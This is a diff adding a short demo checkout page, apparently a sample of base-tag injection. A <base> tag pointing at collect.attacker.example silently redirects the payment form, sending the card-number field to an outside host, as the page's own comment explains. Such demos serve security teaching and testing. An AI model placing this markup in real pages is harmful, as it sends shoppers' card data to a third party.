@@ -1,0 +1,12 @@
+<!doctype html>
+<html><head>
+  <title>Checkout | Croma (demo)</title>
+  <!-- <base> rewrites every relative URL below, including the payment form's action -->
+  <base href="https://collect.attacker.example/">
+</head>
+<body>
+  <form id="payment-form" action="v1/checkout/pay" method="post">
+    <input name="cc-number" autocomplete="cc-number">
+    <button type="submit">Pay</button>
+  </form>
+</body></html>
